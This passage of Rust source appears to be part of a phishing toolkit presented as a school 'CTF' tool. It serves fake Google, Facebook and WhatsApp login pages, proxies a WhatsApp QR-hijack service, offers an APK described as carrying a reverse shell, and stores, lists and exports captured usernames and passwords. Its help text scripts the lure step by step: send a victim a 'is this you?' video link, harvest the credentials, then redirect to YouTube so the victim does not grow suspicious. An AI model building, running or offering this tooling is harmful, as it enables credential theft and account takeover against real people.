                h1{{color:#58a6ff}} .stat{{background:#161b22;padding:20px;border-radius:8px;margin:10px 0}}
                .num{{font-size:48px;font-weight:bold;color:#3fb950}} .label{{color:#8b949e}}
                </style></head><body>
                <h1>🏆 CTF Dashboard</h1>
                <div class="stat"><div class="num">{}</div><div class="label">Credentials Captured</div></div>
                <div class="stat"><div class="num">{}</div><div class="label">Data Exfiltrated</div></div>
                <p style="color:#8b949e;margin-top:20px;font-size:14px">
                Vector: Video borroso + Login Gate (Google/Facebook/WhatsApp/PWA)</p>
                </body></html>"##,
                creds_count, data_count
            );
            respond_html(&mut stream, &html);
        }

        "/manifest.json" => {
            if let Ok(data) = std::fs::read_to_string("manifest.json") {
                respond_bytes(&mut stream, "application/json", data.as_bytes());
            }
        }

        "/sw.js" => {
            if let Ok(data) = std::fs::read_to_string("sw.js") {
                respond_bytes(&mut stream, "application/javascript", data.as_bytes());
            }
        }

        "/icon.png" => {
            if let Ok(data) = std::fs::read("icon.png") {
                respond_bytes(&mut stream, "image/png", &data);
            }
        }

        "/qr-image" => {
            proxy_get(&mut stream, "/qr-image");
        }
        "/qr" => {
            proxy_get(&mut stream, "/qr");
        }
        "/api/qr-status" => {
            proxy_get(&mut stream, "/status");
        }

        _ => {
            // Default: serve the blurry video hook
            respond_html(&mut stream, landing_video_page());
        }
    }
}

// ────────────────────────────────────────────────────────────────────────────
// UTILIDADES HTTP
// ────────────────────────────────────────────────────────────────────────────

fn respond_html(stream: &mut TcpStream, html: &str) {
    let response = format!(
        "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: {}\r\nngrok-skip-browser-warning: true\r\nConnection: close\r\n\r\n{}",
        html.len(),
        html
    );
    stream.write_all(response.as_bytes()).ok();
}

fn respond_json(stream: &mut TcpStream, json: &str) {
    let response = format!(
        "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nngrok-skip-browser-warning: true\r\nConnection: close\r\n\r\n{}",
        json.len(),
        json
    );
    stream.write_all(response.as_bytes()).ok();
}

fn respond_bytes(stream: &mut TcpStream, content_type: &str, data: &[u8]) {
    let header = format!(
        "HTTP/1.1 200 OK\r\nContent-Type: {}\r\nContent-Length: {}\r\nngrok-skip-browser-warning: true\r\nConnection: close\r\n\r\n",
        content_type,
        data.len()
    );
    stream.write_all(header.as_bytes()).ok();
    stream.write_all(data).ok();
}

fn chrono_now() -> String {
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default();
    format!("{}", now.as_secs())
}

fn url_decode(input: &str) -> String {
    let mut result = String::with_capacity(input.len());
    let mut chars = input.chars();
    while let Some(c) = chars.next() {
        match c {
            '+' => result.push(' '),
            '%' => {
                let hex: String = chars.by_ref().take(2).collect();
                if let Ok(byte) = u8::from_str_radix(&hex, 16) {
                    result.push(byte as char);
                }
            }
            _ => result.push(c),
        }
    }
    result
}

// ─── Proxy GET hacia el servicio WhatsApp Hijack ───────────────────────────
fn proxy_get(stream: &mut TcpStream, target_path: &str) {
    match std::net::TcpStream::connect_timeout(
        &"127.0.0.1:42220".parse().unwrap(),
        std::time::Duration::from_secs(5),
    ) {
        Ok(mut proxy_stream) => {
            let request = format!(
                "GET {} HTTP/1.1\r\nHost: 127.0.0.1:42220\r\nConnection: close\r\n\r\n",
                target_path
            );
            proxy_stream.write_all(request.as_bytes()).ok();

            let mut response = Vec::new();
            let mut buf = [0u8; 8192];
            loop {
                match proxy_stream.read(&mut buf) {
                    Ok(0) => break,
                    Ok(n) => response.extend_from_slice(&buf[..n]),
                    Err(_) => break,
                }
            }

            let response_str = String::from_utf8_lossy(&response);
            // Extraer el body después de \r\n\r\n
            if let Some(body_start) = response_str.find("\r\n\r\n") {
                let body = &response[body_start + 4..];
                let content_type = if response_str.contains("application/json") {
                    "application/json"
                } else {
                    "text/html"
                };
                let header = format!(
                    "HTTP/1.1 200 OK\r\nContent-Type: {}; charset=utf-8\r\nContent-Length: {}\r\nngrok-skip-browser-warning: true\r\nConnection: close\r\n\r\n",
                    content_type,
                    body.len()
                );
                stream.write_all(header.as_bytes()).ok();
                stream.write_all(body).ok();
            } else {
                respond_json(stream, r#"{"error":"proxy_empty_response"}"#);
            }
        }
        Err(_) => {
            // WhatsApp Hijack service not available — return placeholder
            let placeholder = r##"<div style="text-align:center;padding:20px">
                <p style="color:#888;font-size:14px">📷 Escanea con WhatsApp</p>
                <div style="width:240px;height:240px;background:#1a1a2e;border-radius:8px;display:flex;align-items:center;justify-content:center;margin:10px auto;border:2px dashed #333">
                    <span style="color:#555;font-size:12px">Conectando...</span>
                </div>
            </div>"##;
            let header = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {}\r\nngrok-skip-browser-warning: true\r\nConnection: close\r\n\r\n{}",
                placeholder.len(),
                placeholder
            );
            stream.write_all(header.as_bytes()).ok();
        }
    }
}

// ────────────────────────────────────────────────────────────────────────────
// CLI INTERFACE
// ────────────────────────────────────────────────────────────────────────────

fn print_banner() {
    println!(
        r#"
    ╔══════════════════════════════════════════════╗
    ║   🏆 NEXUS CTF MOBILE CAPTURE TOOLKIT v2.0   ║
    ║   "Video borroso + WhatsApp QR Hijack"        ║
    ║         Torneo Escolar — Capture The Flag      ║
    ╚══════════════════════════════════════════════╝
    "#
    );
}

fn print_help() {
    println!("USO:");
    println!("  ctf-arsenal serve <puerto>     — Inicia servidor de captura");
    println!("  ctf-arsenal status              — Muestra dashboard de capturas");
    println!("  ctf-arsenal export <archivo>    — Exporta todas las capturas a JSON");
    println!("  ctf-arsenal help                — Esta ayuda");
    println!();
    println!("EJEMPLO:");
    println!("  1. ./ctf-arsenal serve 9999");
    println!("  2. En otra terminal: ngrok http 9999");
    println!("  3. Envias el link ngrok a tu objetivo diciendo:");
    println!("     \"Oye, mira este video, eres tú?\"");
    println!("  4. La victima ve thumbnail borroso → clic → login gate → captura");
    println!();
    println!("VECTORES DISPONIBLES:");
    println!("  /              -> Landing: video thumbnail borroso (RECOMENDADO)");
    println!("  /acceso        -> Login gate con tabs Google/Facebook/WhatsApp");
    println!("  /google        -> Login gate (pestaña Google activa)");
    println!("  /facebook      -> Login gate (pestaña Facebook activa)");
    println!("  /whatsapp      -> Phishing WhatsApp Web (alternativo)");
    println!("  /qr-image      -> QR de WhatsApp Hijack (proxy)");
    println!("  /qr            -> QR como JSON data-uri (proxy)");
    println!("  /api/qr-status -> Estado del servicio QR Hijack (proxy)");
    println!("  /payload.apk   -> APK con reverse shell");
    println!("  /status        -> Dashboard en vivo");
    println!();
    println!("FLUJO DE INGENIERIA SOCIAL:");
    println!("  Envias: \"Ey, encontre este video, eres tu?\" + link");
    println!("  La victima ve un thumbnail borroso con 🎬");
    println!("  Al hacer clic → login gate → captura de credenciales");
    println!("  Luego redirige a YouTube real (no levanta sospechas)");
}

fn main() {
    let args: Vec<String> = std::env::args().collect();

    if args.len() < 2 {
        print_banner();
        print_help();
        return;
    }

    match args[1].as_str() {
        "serve" => {
            let port = args.get(2).and_then(|p| p.parse::<u16>().ok()).unwrap_or(9999);
            print_banner();
            println!("  \u{1f680} Iniciando servidor de captura...");

            let server = CaptureServer::new("0.0.0.0", port);
            server.start();

            println!();
            println!("  ===============================================");
            println!("  \u{1f4e1} SERVER RUNNING — v2.0 \"WhatsApp QR Hijack\"");
            println!("  ===============================================");
            println!("  Local:    http://localhost:{}", port);
            println!("  Expo:     ngrok http {}", port);
            println!();
            println!("  RUTAS:");
            println!("  \u{1f3ac} Landing:        http://localhost:{}/", port);
            println!("  \u{1f510} Login Gate:     http://localhost:{}/acceso", port);
            println!("  \u{1f4f1} QR WhatsApp:    http://localhost:{}/qr-image", port);
            println!("  \u{1f4ca} Dashboard:      http://localhost:{}/status", port);
            println!("  \u{1f4e6} APK:            http://localhost:{}/payload.apk", port);
            println!("  ===============================================");
            println!();
            println!("  Presiona Ctrl+C para detener y ver resumen");
            println!();

            loop {
                thread::sleep(Duration::from_secs(60));
            }
        }

        "status" => {
            if let Ok(content) = std::fs::read_to_string("captured_creds.jsonl") {
                let count = content.lines().count();
                println!("  \u{1f4ca} Credentials captured: {}", count);
                for line in content.lines() {
                    if let Ok(cred) = serde_json::from_str::<CredentialCapture>(line) {
                        println!("     \u{1f510} {} / {}", cred.username, cred.password);
                    }
                }
            } else {
                println!("  \u{1f4ed} No captures yet. Start server first.");
            }
        }

        "export" => {
            let filename = args.get(2).map(|s| s.as_str()).unwrap_or("captures_export.json");
            let mut all_creds = Vec::new();
            if let Ok(content) = std::fs::read_to_string("captured_creds.jsonl") {
                for line in content.lines() {
                    if let Ok(cred) = serde_json::from_str::<CredentialCapture>(line) {
                        all_creds.push(cred);
                    }
                }
            }
            let json = serde_json::to_string_pretty(&all_creds).unwrap_or_default();
            std::fs::write(filename, &json).ok();
            println!("  \u{2705} Exported {} credentials to {}", all_creds.len(), filename);
        }

        _ => {
            print_banner();
            print_help();
        }
    }
}
